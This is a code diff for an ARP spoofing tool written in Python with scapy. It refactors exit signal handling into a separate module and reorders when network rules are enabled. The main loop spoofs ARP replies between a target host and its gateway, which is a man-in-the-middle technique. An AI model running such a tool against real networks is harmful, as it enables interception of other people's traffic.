@@ -2,21 +2,15 @@
 
 import sys
 import time
-import signal
 import argparse
-import subprocess
 import scapy.all as scapy
 from colorama import Fore
 from modules.my_utils import show_message
 from modules.sys_utils import enable_rules, disable_rules
 from modules.net_utils import get_gateway, get_own_mac, get_mac
+from modules.exit_handler import setup_signal_handler
 
 ### Functions #######################################################################################################################
-
-def def_handler(sig, frame):
-    show_message("Exiting the program...", "error")
-    disable_rules()
-    sys.exit(1)
 
 def get_arguments():
     parser = argparse.ArgumentParser(description="ARP Spoofer")
@@ -33,15 +27,15 @@ def spoof(ip_address, spoof_ip, my_mac, victim_mac):
 
 def main():
     try:
-        signal.signal(signal.SIGINT, def_handler)
+        setup_signal_handler(disable_rules)
         show_message("Executing:", "info", "Arp Spoof")
         arguments = get_arguments()
         
-        enable_rules()
-
         router_ip = get_gateway()
         my_mac = get_own_mac(arguments.interface)  # Passar la interfície correctament
         victim_mac = get_mac(arguments.target)
+
+        enable_rules()
 
         while True:
             spoof(arguments.target, router_ip, my_mac, victim_mac)
